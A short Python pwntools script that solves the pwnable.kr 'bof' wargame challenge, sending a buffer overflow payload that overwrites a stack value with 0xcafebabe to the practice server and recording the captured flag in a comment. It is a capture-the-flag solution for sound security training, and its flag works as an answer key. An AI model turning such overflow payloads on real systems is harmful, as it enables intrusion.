from pwn import *

payload = 'A' * 52 + '\xbe\xba\xfe\xca'
p = remote('pwnable.kr',9000)
p.send(payload)
p.interactive()

# flag : daddy, I just pwned a buFFer :)
